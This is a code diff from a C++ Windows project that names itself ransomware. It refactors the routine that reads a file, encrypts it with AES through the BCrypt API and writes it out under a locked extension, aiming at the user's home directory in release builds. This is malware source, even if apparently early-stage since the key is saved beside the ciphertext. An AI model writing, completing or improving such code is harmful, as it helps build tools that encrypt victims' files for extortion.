@@ -20,7 +20,7 @@ int main(int argc, char* argv[]) {
 //	crypt_data* d = generatekey();//TODO also move to encrypt
 
 #ifdef DEBUG
-	string path = "C:\\Programming\\RansomWare\\236499\\test\\rans.txt";
+	string path = "C:\\rans\\236499\\Squanched\\Debug\\rans.txt";
 #else
 	string path = get_home();
 #endif
@@ -57,21 +57,36 @@ DWORD generateKeyAndIV(PBYTE* iv, PBYTE* key)
 	return status;
 }
 
+void initPlainText(string path, PBYTE *buffer, size_t buffSize)
+{
+	std::ifstream plaintextFile;
+	plaintextFile.open(path, std::ios::binary);
+	*buffer = new BYTE[buffSize + 1];
+	char c;
+	for (size_t i = 0; i < buffSize; ++i) {
+		plaintextFile.get(c);
+		(*buffer)[i] = c;
+	}
+	(*buffer)[buffSize] = '\0';
+	plaintextFile.close();
+}
+
+void writeToFile(string path, PBYTE cipherText, DWORD cipherLen, PBYTE iv, PBYTE key)
+{
+	std::ofstream ofile((path + LOCKED_EXTENSION).c_str(), std::ios::binary);
+	ofile.write((char*)iv, IV_LEN);
+	ofile.write((char*)key, KEY_LEN);
+	ofile.write((char*)cipherText, cipherLen);
+	ofile.close();
+}
+
 void encrypt(string path) 
 {
 	DWORD status;
-
+	PBYTE plainText = NULL;
 	size_t plainTextLen = getFileSize(path);
-	std::ifstream plaintextFile;
-	plaintextFile.open(path, std::ios::binary);
-	BYTE* plainText = new BYTE[plainTextLen+1];
-	char c;
-	for (size_t i = 0; i < plainTextLen; ++i) {
-		plaintextFile.get(c);
-		plainText[i] = c;
-	}
-	plainText[plainTextLen] = '\0';
-	plaintextFile.close();
+	
+	initPlainText(path, &plainText, plainTextLen);
 
 	PBYTE iv =  (PBYTE)HeapAlloc(GetProcessHeap(),0,IV_LEN);
 	PBYTE key = (PBYTE)HeapAlloc(GetProcessHeap(), 0, KEY_LEN);
@@ -92,7 +107,6 @@ void encrypt(string path)
 	std::cout << "Plaintext:\t" <<(char*) plainText << std::endl;
 #endif
 	
-
 	BCRYPT_ALG_HANDLE aesHandle = nullptr;
 	status = BCryptOpenAlgorithmProvider(&aesHandle, BCRYPT_AES_ALGORITHM, NULL, 0);
 	if(!NT_SUCCESS(status)) {
@@ -139,20 +153,11 @@ void encrypt(string path)
 #ifdef DEBUG
 	std::cout << "Ciphertext:\t" << cipherText << std::endl;
 #endif
-	std::ofstream ofile((path + LOCKED_EXTENSION).c_str(), std::ios::binary);
-	ofile.write((char*)iv, IV_LEN);
-	ofile.write((char*)key, KEY_LEN);
-	ofile.write((char*)cipherText, cipherSize);
-	ofile.close();
-
-	delete plainText;
+	writeToFile(path, cipherText, cipherSize, iv, key);
+	
 	//TODO CLEANUP!!!!!
+	delete plainText;
 }
-
-
-
-
-
 
 
 //string get_username() {
